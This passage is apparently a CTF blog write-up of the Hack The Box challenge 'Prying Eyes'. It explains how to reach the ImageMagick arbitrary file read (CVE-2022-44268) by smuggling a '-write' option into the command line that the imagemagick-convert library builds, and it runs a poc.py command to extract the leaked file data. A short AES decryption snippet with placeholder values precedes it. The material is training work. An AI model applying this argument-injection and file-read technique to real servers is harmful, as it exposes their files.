+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">const</span> algorithm = <span class="hljs-string">&#x27;aes-256-ctr&#x27;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">decrypt</span> = (<span class="hljs-params">cipher, key</span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> decipher = crypto.<span class="hljs-title function_">createDecipheriv</span>(algorithm, key, <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(cipher.<span class="hljs-property">iv</span>, <span class="hljs-string">&#x27;hex&#x27;</span>));<br>    <span class="hljs-keyword">const</span> decrpyted = <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">concat</span>([decipher.<span class="hljs-title function_">update</span>(<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(cipher.<span class="hljs-property">content</span>, <span class="hljs-string">&#x27;hex&#x27;</span>)), decipher.<span class="hljs-title function_">final</span>()]);<br>    <span class="hljs-keyword">return</span> decrpyted.<span class="hljs-title function_">toString</span>();<br>&#125;;<br><br><span class="hljs-keyword">let</span> cipher = &#123;<br>    <span class="hljs-string">&quot;iv&quot;</span>:<span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-string">&quot;content&quot;</span>:<span class="hljs-string">&quot;xxx&quot;</span><br>&#125;;<br><br>key = <span class="hljs-string">&quot;xxx&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">decrypt</span>(cipher, key));<br></code></pre></td></tr></table></figure>
+
+<h1 id="Prying-Eyes"><a href="#Prying-Eyes" class="headerlink" title="Prying Eyes"></a>Prying Eyes</h1><blockquote>
+<p>Welcome to the Prying Eyes, a “safe space” for those curious about the large organisations  that dominate our life. How safe is the site really?</p>
+</blockquote>
+<p>ImageMagick Any File Read —— CVE-2022-44268</p>
+<p>In the version prior to 7.1.0-51 on ImageMagick, there is a information  disclosure vulnerability that is able to be used to read arbitrary file  when modifing a PNG file.</p>
+<p>Reference👉<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/imagemagick/CVE-2022-44268/README.md">Click Me</a></p>
+<p>But in this challenge, the file is restrictly converted to a AVIF file. The CVE works only when ImageMagick processes a PNG file.</p>
+<p><img src="/../img/image-20230830104922194.png" srcset="/img/loading.gif" lazyload alt="image-20230830104922194"></p>
+<p>Is there any way we can change the <em>format</em> parameter to <code>PNG</code>?</p>
+<p>This application relys on <code>imagemagick-convert</code> dependency</p>
+<p>👉<a target="_blank" rel="noopener" href="https://github.com/izonder/imagemagick-convert/blob/master/lib/convert.js">https://github.com/izonder/imagemagick-convert/blob/master/lib/convert.js</a></p>
+<p>It turns out this dependency simply spawns a new process to call magick. It concatenates the command options we pass.</p>
+<p><img src="/../img/image-20230830110315086.png" srcset="/img/loading.gif" lazyload alt="image-20230830110315086"></p>
+<p><img src="/./../img/image-20230830110645560.png" srcset="/img/loading.gif" lazyload alt="image-20230830110645560"></p>
+<p>Go through the ImageMagick official <a target="_blank" rel="noopener" href="https://imagemagick.org/script/convert.php">manual</a></p>
+<p>There is a command option <code>-write filename</code> which can write images to that file.</p>
+<p><img src="/./../img/image-20230830111228332.png" srcset="/img/loading.gif" lazyload alt="image-20230830111228332"></p>
+<p>Download the exp.png and extract the information using poc.py</p>
+<p><code>python .\poc.py parse -i .\exp.png</code></p>
+<p><img src="/./../img/image-20230830111531362.png" srcset="/img/loading.gif" lazyload alt="image-20230830111531362"></p>
+<p><img src="/./../img/image-20230830111549427.png" srcset="/img/loading.gif" lazyload alt="image-20230830111549427"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/security/" class="print-no-link">#security</a>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Hack The Box Challenges</div>
+      <div>http://example.com/2023/08/05/htb-1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/05/sqli/" title="SQL injection Black Magic">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SQL injection Black Magic</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/01/ysomap-2/" title="YSOMAP取经之路-2">
+                        <span class="hidden-mobile">YSOMAP取经之路-2</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
